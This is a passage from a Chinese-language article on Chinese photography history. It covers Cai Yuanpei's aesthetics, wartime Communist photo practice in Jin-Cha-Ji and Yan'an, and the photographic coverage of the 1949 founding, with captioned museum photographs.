下的五个小节，对摄影的概述大致同前文。这两则对当时摄影的综述，都从文化史的角度肯定了摄影艺术。</p>
<p>除了上述两文直接论述外，蔡元培在其《美学的研究方法》和他为商务印书馆《教育大辞典》所撰写的 “美育” 条目中，也间接提及摄影。在前文中，他在论述  “人的美感” 问题时，援引欧洲美学家 Witask 的话来证明 “统一” 的风景既可供审美主体摄影，也可 “入画”，这就肯定了摄影艺术的地位，龙熹祖先生认为 “这是中国美学史上第一次从理论上肯定并确立摄影艺术的性质。”在后文中，他写道：“各级学校，于（美育）课程之外，尚有种种美育之设备。例如，学校所在之环境有山水可赏者，校之周围，设清旷之园林。而校舍之建筑，器具之形成，造象摄影之点缀… ” 虽 “美的程度不同”，但皆 “含有美育之原素”，都有审美价值。所以说，蔡元培是较早明确地、直接地肯定了摄影的美学价值和探讨摄影艺术的学者。</p>
<p>在《与时代画报记者谈话》中，蔡元培认为 “读文章总不如见到形状来得更可以感动。况且从文章力度来的和照片里看来的根本是两样东西，印象也不同。” 重视媒体中图片的价值。在这篇文章中蔡元培对科技、机器对人性的异化有一段精辟的论述，他认为，“现在的世界，一天天往科学路上跑，盲目地崇尚物质，似乎人活在世上的意义只为了吃面包。以致增进了贪欲的劣性，从竞争而变成抢夺，我们竟可以说大战的酿成，完全是物质的罪恶。现在外面谈起 ‘第二次世界大战’ 的议论很多，但是一大半只知裁兵与禁止制造军火；其实只仍不过是表面上的文章，根本办法仍在于人类的本身。要知科学与宗教是根本绝对相反的两件东西。科学崇尚的是物质，宗教注重的是感情。科学愈昌明，宗教愈没落；物质愈发达，情感愈衰颓；人类与人类便一天天隔膜起来，而且互相残杀。本是人类制造了机器，现在人类却变成了机器的奴隶，受了机器的指挥，不惜仇杀同类。” 在这里，蔡元培认识到了科学知识是一把双刃剑，唯科学主义将给个人、社会和人类带来灾难。所以，蔡元培提倡美育，“以美育代宗教”，用美育来消除片面发展科学所带来的危害。“便是使人类能在音乐、雕刻、图画、文学里又找见人类遗失了的情感。我们每每在听了一支歌，看了一张画、一件雕刻，或是读了一首诗、一篇文章以后，常会有一种说不出的感觉；四周的空气会变得更温柔，眼前的对象会变得更甜蜜，似乎觉到自身在这个世界上有一种伟大的使命。这种使命不仅仅是要使人人有饭吃、有衣裳穿、有房子住，他同时还要使人人能在保持生存以外，还能去享受人生。知道了享受人生的乐趣，同时便知道了人生的可爱，人与人的感情便不期然而然地更加浓厚起来。那么，虽然不能说战争可以完全消灭，至少可以毁除不少起衅的秧苗了。”在当今物欲横流的时代，蔡元培对机器和工具理性如此冷静而精辟的真知灼见，以及他的美育思想有很多借鉴意义。</p>
<p><strong>战争与建国：</strong></p>
<p><strong>1949 年的中国摄影</strong></p>
<p>文 &#x2F; 高初</p>
<p>新中国摄影话语的建构，是围绕着对于战争时期摄影话语的吸纳、转化和改造展开的。这不但是因为这两个时期有着趋同的革命视觉化的内在工作机理与拍摄题材，也同样和拍摄者在他们最重要的摄影时期所奠定的经验、方式乃至风格密切相关。</p>
<p>新中国时期的摄影往往被认为是一种 “宣传摄影”，或者被一些研究者具体地称为 “社会主义现实主义摄影”。摄影作为伴随中国革命创造和嬗变的文化系统中的一类视觉呈现至今仍包围着我们的生活，天安门正中悬挂的毛泽东像就是最为平常的一则例子。甚至我们每天读到的新闻图片，我们看到的摄影展览，都能或多或少地找到过往的影子。这一摄影时期不但发展了一套政治新闻、工业、农业、经济、教育等方面的摄影拍摄方式，而且也建立了一种代代传递的审美习惯。</p>
<p>新中国图像的制造者，按动照相机快门的人，是名字可查、数量有限的一个群体。他们中的有些人在民国时期的摄影活动中享有声誉；另一些，在战争年代开始摄影生涯的人，也间接性地接受了民国摄影的视觉经验。他们中的大部分人在战争时期的摄影实践中建立了一套新的摄影意义系统和视觉形式，并且在新中国成立后，因为受到信任和过往的摄影经验，成为新中国为数不多的官方摄影师。他们一般在 20 世纪 80 年代结束摄影创作，但仍通过在官方机构的任职，以及展览、著述和讲座的方式，在之后相当长的时期里对中国摄影师产生影响。无论如何，这个摄影群体制造了在半个世纪中能够被公众看到的绝大部分重要图像。那么在这一系列符合革命需要（战争时期与新中国时期）的历史性的图像产物之外，这个群体有没有个人化的艺术创作？这个问题也可以这样问：他们在通常被我们视为 “宣传员” 的身份之外，是否也是艺术家？是否也进行着晚清以来摄影领域的视觉现代性的探索？那些个人化的情感性的图像表达，那些对于摄影本体性的拓展，是压根不存在呢，还是被官方的审定和认可遮盖和压制，没有被我们看到？即使我们认为他们满怀真诚而热情地投入到一种现实主义的摄影美学系统和摄影模式的建构中，除了演变中的革命意识形态的表达性和功能性之外（本文涉及的延安图式正是这种摄影图像意识形态规范的源起和构成），他们的摄影是否也成为现代国家意义上的新中国的图像生产和传播的功能性组成部分？这种现代意义的图像建构，是否一方面继承了中国的悠久和坚固的视觉审美传统，一方面也是迈向现代中国的全新的文化结构在视觉表达层面的重建？</p>
<p>对于他们生涯和创作的摄影史研究面相，是否和同一时期的文学史、绘画史乃至文化史是一致的？我们能否找到视觉现代性在革命时期的继承和发展或者说，在前文中并没有给出明确的新定义的 “视觉现代性“ 的概念，是否是一个来源于却又针对于西方对于中国视觉材料研究的学术传统，而带有我们自身问题意识的一系列学术对话的起点革命史视角的 “视觉现代性”，能否成为一种不同于西方的视觉现代性概念的新的观察？这种观察，起码能使我们重新反思当下对于西方艺术现代性的简单模仿，和在中国摄影与其两者间不假思索架设的继承关系。</p>
<p>对于摄影生涯和革命话语有复杂的伴生关系的这一代摄影者，随着新史料的发现及个案研究的推进，也许可以促成就这一时期中国摄影的新的讨论。但这一讨论也同时面临着两个巨大的困难，一是类似于现代性范式和革命史范式研究框架对于我们所处理的近代图像史料的理解；二是一套有别于西方艺术史价值预设的对于近代中国剧变中摄影师生涯和摄影意义的新的解读途径。</p>
<p>作为现代性的工具的摄影，在这一时期一方面集中地体现了中国抒情传统到西方史诗叙事的文化转型，一方面成为了国家能力和民族性建构的功能性载体，这都是西方摄影发展中没有遭遇的像近代中国这样激烈而有深刻影响的历史境遇。也正是在这一时期，东西方文化碰撞的巨大能量，体现了新中国的精神气质，赋予了这一代摄影者在视觉性的实践探索和理论重建中的历史使命。以及具体的摄影题材和表现方式。摄影不但是这场剧变的记载媒介，而且是这场重建的组成部分。</p>
<p>也正是在战争摄影时期中，一套在新中国摄影时期起着决定性影响的 “形态规范” 初见萌发，这一规范在摄影实践层面体现为以 “宣传” 为表征的摄影的话语系统，摄影者对于这一规范的遵从程度也直接影响他们在新中国时期的摄影机会和人生境遇。摄影者的主体性消退和被压抑，我们需要在创作中艰难地寻找摄影者视觉探索和审美追求的痕迹。</p>
<p>战争摄影时期可以被视为摄影者确立并发展着自身的摄影风格，建立一种革命历史中的个人主体性的摄影实践的探索过程。但总体来看，也正是在这一时期发展出两条在新中国时期纠缠、嬗变的摄影话语系统，并对今天的摄影仍有极大影响：<strong>晋察冀图式</strong>和<strong>延安图式</strong>。这两种图式并非有着迥异的视觉形式、功能机制和实践主体，而始终有着紧密的纠缠关系，并在相互作用中嬗变；但作者仍然认为明确提出这两种图式，并细致研究其各自演进的内在机制和相互影响，有助于一我们形成对战争时期中国摄影和新中国摄影在革命语境下更明确的理解。</p>
<p>在晋察冀模范抗日根据地一方面发展出一种带有战地纪录和战争鼓动功能的摄影方式，一方面也发展出边区的报道摄影和新闻摄影模式。而在这一特定历史时期发展起来的报道摄影模式，被新中国的摄影机制在人员构成、工作方式和图像模式等方面有机承，同时也伴随着演变中的革命意识形态规范而嬗变。我们也观察到，战时晋察翼摄影系统，一方面提供了一套摄影者的培养系统和图片评价标准，一方面也提供了一套图片拍摄、传播和观看的现代意义的图像生产方式。这套系统从华北平原的晋察冀山区被移植到其他解放区并随着战争推进而广为扩散：如《东北画报》的前身翼热辽画报，如和《晋察翼画报》系统合井为《华北画报》的晋翼豫体系。但需要强调的是，晋察翼系统的图像，在过往的党史和军史的图像史中并没有突出的位置，但晋察翼的图式在艺术史层面的意义无疑是值得注意并重新讨论的。</p>
<p>在抗战时期的延安，从 “整风运动” 至 “中共七大”，其文化系统也经历着巨大的变动。在此演变过程中意识形态规范对于摄影有着直接而巨大的影响，我们试图从延安图式这一概念的明确提出进入其内在。作为现代性工具的摄影，吴印咸和郑景康，在民国时期有着摄影实践的摄影师，在这一时期除了对这一革命圣地进行图像记录之外，也试图自觉地突破过往的视觉形式，使自身的摄影实践融入革命洪潮中。摄影的功能性和表现方式，基于他们过往的视觉经验系统，逐渐转变为 “深入群众”、“唤起群众” 和 “摄影的教化作用”。如果说这两位摄影者的早期摄影视觉形式可以和西方现代主义作比较研究，一方面，他们的摄影是这种转变中的革命意识的视觉呈现，一方面他们也试图建立一种革命意识的规范。而这一延安时期实践和理论上的成果，被新中国摄影继承和发展，在 20 世纪 50 年代后半期充分确立，并在 “文化大革命” 时期达到顶峰。这里需要强调的是，相对于新中国时期这种表现对于摄影师工作机会和人生境遇的决定性影响，延安时期对于摄影者的强制性并不明显，而是一种艺术家在国家危亡这一特定历史时期自发性的转向以及围绕《延安文艺座谈会讲话》精神的自我约束、服从和转型。在摄影的功能被强调的转变中，如何处理图像形式、表达手法等摄影本体和美学层面的话题，正是这一摄影话语转型中值得重视的经验。回顾摄影者在这一过程中所做的艺术本体性的艰难探索，是我们在今天的节点上重新讨论中国摄影的审美传统和社会功能的意义所在。</p>
<p>1949</p>
<p>一个时刻和新中国摄影机制的生成</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmX2FuLjcT0K7qkMXWySoonhSibb32yyXvxLd8WxZxs26vqPnUx5jSPdw/640?wx_fmt=jpeg" alt="img"></p>
<p>1949 年 2 月 9 日，庆祝北平解放大会上，听北平市长叶剑英讲话的北平民众，北京。</p>
<p>February 9, 1949, Peiping people listened to the speech given by Peiping mayor, Ye Jianying, on the celebration meeting of peiping liberation, Beijing. </p>
<p>1949</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmmJuuibrCNx4FEqF6hVNKsE4fuPwSGhF99wfc7lMe1mRwHlXz09jOepQ/640?wx_fmt=jpeg" alt="img"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmPHMUJRhQdut9XP9xk0UuhicuMTnHO2NFYQq0EFDVELIBNA2hywg6KWA/640?wx_fmt=jpeg" alt="img"></p>
<p>在抗战初期摄影、木刻、绘画、实物等一并作为战绩展览的陈列，但因为摄影展览的效果好，逐渐成为了单独的展示媒介和集会场所。在 1939 年春节，沙飞和罗光达在晋察冀军区驻地冀西平山县蛟潭庄举办敌后第一个街头新闻照片展览。展出的内容，“有八路军光复城镇、缴获日军的枪炮、马匹、军用品以及群众参军、部队生活、据地群众生产等。照片基本上是沙飞拍的当地群众没有见过这样的新闻照片，参观的人像赶庙会一样的热闹，部队整队前往参观，附近村里的群众，包括六、七十岁的老头子、老太太和七、八岁的娃娃都争先恐后地去看。当地妇教会的青年妇女帮助照顾和讲解，人们对八路军的战绩和缴获极感兴趣，‘山沟里来了照相的’ 成了头号新闻。”</p>
<p>与抗日战争初期曾在国统区广泛出版的围绕战争的通讯和都市画报不同，这时的摄影已经成为敌后解放区面对和克服物质的匮乏，重塑民族性的政治、社会和文化的功能载体，而且愈发成为 “宣传战和思想战的重要武器”。仅在 1941 年上半年，晋察冀边区政府新闻摄影科 “… 在军区各驻地、在街头、在部队俱乐部、在前线（利用战斗间歇时间）组织各种展览，到 1941 年上半年共举办 50 多次。”</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmKQ7IESvheltG1VvXic08ScjTzNhTWMJwgnDXibYFN6aVNiaNj1wQ3ia0wQ/640?wx_fmt=jpeg" alt="img"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmRVLiaAOnHYicRrO6YUWicZ8nHZYt9HjoDD5R7nm3Cq7s1IyR1WnWafGZw/640?wx_fmt=jpeg" alt="img"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm0FVHycMYTlSBheTzrxMEK7KwKiaicj37IC6TIErYw9qB1DMKMOaGwiaeg/640?wx_fmt=jpeg" alt="img"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmQxKF3RIDOJzXCibMcn8CaRq5iblp1u11vwmWc14UqEOcTZIXOae03gUQ/640?wx_fmt=jpeg" alt="img"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmOAz8gKUMgToYTh4LYYC9jRTPT6icLX1ibHDt6mkdth2tnh7VRkGZnKtQ/640?wx_fmt=jpeg" alt="img"></p>
<p>也是在这一时期，前线的摄影工作不但需要建立 “摄影网”（紧密配合的工作网络），而且每一基层作战单位也要配备摄影工作者，解决照相物资，并且摄影工作的完成与否成为了政治工作是否合格的重要衡量，摄影成为在战争时期如此重要的一个环节，我们可以从留存的电报、通令、指示、通报、通知、守则等业务文件窥得一二。在笔者 2009 至 2014 年对于几十位战争时期的摄影者的口述采访中，也得到 “跟随作战部队的摄影者作战部队紧密配合”，“‘摄影战士甚至比政委更能鼓舞作战士气” 的强烈感受。</p>
<p>在 1944 年 10 月 5 日，为加强新闻摄影工作，晋察冀军区政治部给各军分区发了一封业务电报。电文指出：</p>
<p>“新闻照片对外宣传作用极大… 为加强这一工作，定各分区仍保留摄影干事，由三个干事中的一个兼任，团和支队增设一个摄影干事，如无摄影人才与器材，应积极设法逐渐解决。今后各军分区、团、支队政治首长应经常派出摄影员到前线拍摄照片，并对这一工作给予具体帮助和督促检查，使照片、底片能及时送晋察冀军区。”</p>
<p>一周内，冀热辽军分区通令各团、区队:</p>
<p>… 殊有加强我部队新闻摄影工作的必要，兹决定团设新闻摄影干事二人，独立区队设一人。……各团、队在执行战斗任务时，各级指导员须通知摄影干事参加，俾得摄取我军英勇的战斗成绩，必要时，在不影响执行战斗的原则下，各部队指战员，应适当掩护其收集材料。… 各团、队政治处很好地领导这项工作，并根据当时的中心任务，给予具体指导和检查，以充分发挥其作用，同时将这项工作列入政治工作计划和总结内，向军分区汇报。”</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmkOqqzWToOoUtetmWdWYYE6OuGZNXMicrg0wribdpbRVt1bCMw7ibOw9ew/640?wx_fmt=jpeg" alt="img"></p>
<hr>
<p><strong>入城</strong></p>
<p>1949 年 1 月 22 日，国民党华北 “剿总” 司令傅作义接受中共 “和平解放北平” 的号召在《关于北平和平解决问题的协议书》上签字。1 月 31 日，中国人民解放军进入北平，古都北平宣告和平解放。高帆和齐观山在北平正式解放前已经随部队先行进入北平，并与高粮、杨振亚、孟昭瑞等参与了北平入城式的采访报道。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmk8p2CyusAicwW6BQCX4od026bPMVjuDoNkVTULYRg1CRBbkC5ia704OQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1949 年 9 月 30 日，全国第一届政治协商会议上，毛泽东当选中华人民共和国中央人民政府主席</strong></p>
<p>September 30, 1949, Mao Zedong was elected as the chairman of the central people’s government of People’s Republic of China at the first national political consultative conference, Beijing</p>
<p>1949</p>
<p>林杨</p>
<p>数字微喷 Inkjet Print </p>
<p>作品由中国美术学院美术馆收藏</p>
<hr>
<p><strong>建国</strong></p>
<p>中共中央宣传部对 1949 年全国政治协商会议和开国大典的新闻摄影报道工作十分重视。在八月中旬委托大会筹备会新闻处加以妥善地组织、积极地筹划，并拟定大会新闻摄影工作方案。新闻处于 8 月 19 日提出 “大会摄影工作计划”，决定 “新处原设的摄影科分成摄影、电影两科”。为加强摄影科的工作力量 “由华北军区政治部华北画报社、中央电影管理局北平电影制片厂照相科、东北局东北画报社三单位合作” 抽调干部组成，“并推定华北画报社主持“，“由吴群任科长…… 在会场内工作者六人为：陈正青、侯波、吴群、林扬、杨振亚、孟昭瑞。在会场外协助冲洗等工作者以十二人为原则。” 并规定 “大会摄影完全由新闻处摄影负责，举凡报纸、刊物及其他宣教机构需要的照片，由新闻处摄影科统一供给”，其他人员 “谢绝携带照相机入场”。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm921g3BLr1Phzp5n59eDfjYVoEL8b4iaRpkas8Eln2qYIfEMchnKuMnw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1949 年 10 月 1 日，开国大典，北京</strong></p>
<p>October 1, 1949, the founding ceremony, Beijing</p>
<p>1949</p>
<p>陈正青</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmD28szhFwibmZc545P0icoWpKbXLjWSeCsS3lujDgd6bq583bDIN0RpvQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1949 年 10 月 1 日，天安门第一次升旗五星红旗，北京</strong></p>
<p>Five-Star Red Flag was raised in Tian’anmen Square first time October 1, 1949, Beijing</p>
<p>1949</p>
<p>熊知行</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<hr>
<p><strong>中国革命的视觉档案</strong></p>
<p>研究 &#x2F; 策划：高初</p>
<ol>
<li><strong>革命理念的视觉化</strong></li>
<li><strong>1938 年的武汉：画笔、刻刀、歌声与摄影机</strong></li>
<li><strong>白求恩：从马德里到华北</strong></li>
<li><strong>华北一个村庄的革命：柯鲁克档案</strong></li>
</ol>
<hr>
<p><strong>革命理念的视觉化</strong></p>
<p>齐生、舒宗侨、顾棣所编著的《中国摄影史 1937-1949》开篇写到：“1937 年 ‘七·七’ 抗日战争发后》…… 八军和新四军开赴敌后，在华北、华东、华中广大地区发动群众开展武装斗争，建立抗日根据地。随着抗日武装和抗日根据地的发展、巩图和壮大，逐步具备了建立摄影工作的条件。在中国共产党领导下的，为抗日战争和解放战争服务的摄影工作，才逐步建立和发展起来，并且成长为新中国摄影事业的基干力量。” 这段话是亲历者对于摄影工作的回顾，也折射出与党史叙事紧密关联的摄影史观。</p>
<p>在抗日战争初期，来自上海、广东、浙江等地的摄影者，在从事前线采访和边区新闻摄影的同时，以报、展览和摄影训练班的方式，发展出一套旨在重新界定摄影的意义、目的、 题材和方式的战争时期的摄影话语。伴随着这一摄影者的群体在规模上发展、在风格上成熟，这一过程也涉及摄影师自身的民国时期摄影经验的转化，这其中不但包含他们投身战争摄影之前的地域性的摄影经验，也将包含他们这一时期从事摄影活动重新吸收转化的新的地域性视觉经验。但更易被观察到的，则是对两类摄影形态的吸纳和转化：民国报道摄影的传统，左翼文化对于摄影的影响。</p>
<p>抗战后期到内战时期，随着军事进程的发展，解放区的摄影队伍的工作性质的发生了很大的改变，最显著的特点是共产党摄影工作的效用机制，从边区政府新闻摄影科演变为跟随部队快速转移、和部队紧密配合的摄影战士。</p>
<p>1946 年，“为了加强摄影工作的新闻性、及时性，11 月 15 日军区野战政治部发出关于摄影工作的指示，要求纵队设摄影股，旅设摄影干事 1 至 2 人，深入、全面地报道爱国自卫战争的英勇斗争场面。画报社分成前后两部分，前方成立前线工作组，随野战军政治部活动，及时组织照片展览。为适应战争的需要，从 1946 年 12 月 30 日起，画报社定期出版《晋察冀画刊》……强调 画刊的新闻性和战斗性，要求争分秒，密切配合形势，照片的标题说明多用群众语言，要让战士看得懂，并有鼓动性和艺术性。……自第 29 期起，画刊移到前线随军出版……到 1948 年 5 月 2 日出版最后一期，在将近一年半的时间里共计出版 44 期，平均 12 天出版一期……每期发表 3 组照片共 20 幅左右，印刷一万份，主要发到野战部队，每个班 2 份。” 这一过程中，摄影者的身份从为画报社供稿的前线通讯员转变为鼓舞士气的 “摄影战士”。图像观看者从根据地的党政干部和根据地农民转换到摄影者所跟随的部队士兵的过程中，摄影不但成为部队政治学习、文化教育的常规环节、甚至转变为一种军事作战的仪式：“有组织的拍摄” 和 “集体观看与讨论” 成为被提倡的工作经验。1946 年 11 月 15 日《晋察冀军区野战政治部关于摄影工作的指示》中明确规定摄影股的任务:</p>
<p>“<strong>在部队中进行照片展览、画报阅读。</strong>”</p>
<p>摄影的战争鼓动的功能出现在抗战初期，石少华提出 “摄影工作者是激励士气的一支重要的战斗力量” 并举例 “百团大战的某连连长说：‘上级给我们拍照，让全国、全世界人民看，我们就要在战场上加油干。’ 他以此鼓舞全连完成任务，歼灭敌人。战士们都能感到能将自己的照片刊登在画报上是无上光荣的事情。” 而到了内战时期，士兵接受拍摄，刊载在画报上，成为立功嘉奖的方式。如 “解放军很多连队指导员把 ‘努力作战，争取上画报‘ 作为战斗动员的口号，并把《东北画报》作为奖品赠给有功人员。” “（东北画报）成为 ‘部队中第一种受欢迎的读物’ 和 ‘部队的主要教材之一‘, ‘能够经常配合政策任务，在战士整训中起推动和组织作用’。”</p>
<p>吴群《为英雄模范及功臣拍照的体会》一文提到：</p>
<p><strong>“拍照前要首先在营连进行宣传动员，说明当了英雄、模范、功臣，给他照像是一种无比光荣的奖励，拍照后像片在各处展览，印在画报上，哪都看见，连毛主席也知道。晋察冀部队的立功条例中，曾明确规定了 ’论功照像嘉奖‘ 一条，肯定了这一做法和功用。”又要注意“ 拍照前要依靠组织安排、尊重领导机关的意见……以免照时发生偏差，如给立小功的同志照了，而没有给立大功的同志照等。”，同时也要 “利用连队集合时候，事前和指导员商量好，由他向大家讲几句，说明上级为什么派人来，跟谁照像，他为什么值得照像表扬，希望大家向他学习等等，然后再把英模及立功同志一一叫到队前来照，这样影响大，效果好。……如有必要，亦可多给他晒上一张，让他寄回家去，使其家属也感到无限光荣。”</strong></p>
<p>在笔者的口述史采访中，也得知摄影的仪式效果有时已经大于照片本身。对于冲锋的战士，拍照后因为照片很难及时洗印，牺牲的士兵再也看不到。在有的采访中，我们也得知，在胶片较为紧缺的时期，有时相机甚至没有条件装胶卷，摄影这一行为成为纯粹的仪式。</p>
<p>基层作战单位有组织地观看照片也成为军事作战的一个环节：</p>
<p><strong>“日常照片展览一次不宜太多，二三十张最好……展出的每张照片距离间隔不可太密，否则大伙挤在一起看不好……展出的照片标题说明，文字要写的大一些，不要写战士看不懂的字，要短小精悍，编成通俗的歌谣、快板更好，这样易念易懂又有趣……展览用的新闻照片，可一一贴在卡纸和布条上，再用绳子把它连接起来，平时折叠放在挎包内携带方便，当部队行军途中休息时，能很快取出张挂于树林或墙壁上让战士们观看，这是在野外举办流动照片展的好方式……战士很喜欢，值得介绍推广。”</strong></p>
<p><strong>“在部队展览照片时，要注意倾听观众的反映，每次展出应写展览日志，将时间地点、单位、观众人数、展览内容、意见及反应等记录下来，以便总结经验，改进工作时作参考。”</strong></p>
<p>在战争时期，通过摄影训练班的方式，摄影者的知识、经验和观念得以传递给学员。这不单是摄影作为现代性的表征逐渐渗透进闭塞的共产党所控制的乡村，而且革命的视觉生产机制也在这一过程中重新建立了一套程序、概念和规范，实质上是通过物质性的媒介生产和仪式性的拍摄现场建立的政治视觉机制和文化视觉机制，这一过程随着政治运动的不断展开而深入、明确。</p>
<p>对于艺术家而言，从抗战 “救亡” 到内战 “动员”，他们的个人生涯和艺术探索和正在变动中 “革命视觉化” 实践紧密结合，同时也伴随现代国家和现代民族的文化视觉构造。艺术家不但放弃了自身的主体性投入到这一工作中，艺术家也正是在这一过程中生成了自身的主体性：建立视觉经验和审美情态、探索个人的风格。战争时期和新中国时期的中国摄影史，是由摄影群体在战争时期和新中国时期的摄影生涯和个人的生命史构成。他们对于摄影的 “效果论” 的理解，他们驾驭的题材，乃至他们所参与的民族解放和国家建立的情感上的撞击，逐渐地内化于他们的生命经验和艺术风格。东西方文化碰撞的巨大能量，从殖民地状态到建立新中国的精神气质，赋予了这一代摄影者在视觉性的实践探索和理论重建中的历史使命，以及具体的摄影题材和表现方式。摄影不但是这场剧变的记载媒介，而且是这场重建的组成部分。史诗叙事和革命动员逐渐成为他们生涯中被显现的情感结构和艺术状态。以现代主义为主线的艺术家的个人探索贯穿他们的生涯始终，但是往往隐藏在具体的革命题材中。</p>
<p>从媒介的角度观察，摄影随着战争的推进，逐渐成为了常规性的作战环节，在这一转换中，相对于通常而言的摄影的结果（底片和画报），摄影的过程（拍照现场和拍照行为）成为核心要素。摄影在观看后产生的效用（ “心里燃起一股热力” ），蕴含着中国的摄影在战争的特定情况下，摄影的意义系统从拍摄者转向到观看者，摄影的评价效果也在于对于观看者的情绪的触动和行动的激发。这一拍摄者和观看者的主客体的转换，意味着摄影的主体与观念、题材与语言、媒介与现场都发生了意味深长的置转和重组。“作为仪式的拍照” 和 “革命时期的宣讲式的观看” 成为自战争时期至新中国，乃至今天我们讨论中国摄影的两个核心概念。这种摄影的经验，既转化为摄影者对于新闻摄影工作的认识和个人创作，也转化为新中国时期的摄影机制和新闻摄影理论。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm96sN1LicWibyxxUKfibY5zZ7XulIg1DQib7WABMIbHjvdlYb4KzFQpumoQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>保卫国土，保护家乡</strong></p>
<p>War of Resistance, Defending the nation, defending one’s home</p>
<p>沙飞</p>
<p>中国美术学院美术馆藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmVTmiaiaZw8UTbRVujddVcBtWHqXYvX8bczyXOrKuIppcxXINJ29bX4Tg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1936 年 在前线瞭望的军人</strong></p>
<p>1936 Soldier keeping a lookout on the frontline</p>
<p>1936</p>
<p>方大曾</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmmONgC1xGewBn6vTbNP36DwcUGIa9MyvtIyOE1kicV8PlkImtqEsUxMw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1940 年 8 月，百团大战前夕，聂荣臻召开主攻部队首长会议。（左起）舒同、聂荣臻、杨成武、聂鹤亭在平山吊儿庒</strong></p>
<p>August 1949 On the eve of the Hundred Regiments Offensive Nie Rongzhen convened a meeting of the main military commanders (from left: Shu Tong, Nie Rongzhen, Yang Chengwu and Nie Heting) at Pingshan, Hebei.</p>
<p>1940</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmhBhrArJpq2B3YInHgEzI50yE8iaJJ1QZEoia6UvdfNTDOibaWIpC6ibMgg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>战壕里的读报小组</strong></p>
<p>Group of soldiers reading a newspaper in the trenches</p>
<p>1939</p>
<p>沙飞</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmQmYRaZcHn3uTpWQGCbeGZGQKicJTNx5zFAjqIhAY75nfpn209LXugibg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1940 年 8 月，百团大战前夕，聂荣臻召开主攻部队首长会议。（左起）舒同、聂荣臻、杨成武、聂鹤亭在平山吊儿庒</strong></p>
<p>August 1949 On the eve of the Hundred Regiments Offensive Nie Rongzhen convened a meeting of the main military commanders (from left: Shu Tong, Nie Rongzhen, Yang Chengwu and Nie Heting) at Pingshan, Hebei.</p>
<p>1940</p>
<p>沙飞</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmWFhgrvFoVAcXP68ibSaFic5bVepkXQzpHiblJ0ol5ta0fmvdX0zb41PRQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>正太路前线，妇女担架队</strong></p>
<p>Women stretcher team at the front line, Zhengding-Taiyuan railroad</p>
<p>1940</p>
<p>沙飞</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm3k5G1OUezMu3ricgugGMsQGUJbY9zuUpYZRsv6JAIl3Tia6UUoibqNcGQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>哨兵 1938 年 延安</strong></p>
<p>1938, On sentry duty, Yan’an</p>
<p>1938</p>
<p>吴印咸</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmKRW38GZzkPibico8d3Ru7SQnFtDU39RUhcNCGEEqgcEwwEqN99nRmm8g/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1939 年 5 月八路军一二 0 师三五九旅五台战斗后遣返俘虏，日俘唱歌表示感谢</strong></p>
<p>May 1939 Japanese prisoner sings to the 359th Brigade from the 120th Division of the Eighth Route Army to express his gratitude for being returned to the Japanese after the Battle of Wutai</p>
<p>1939</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
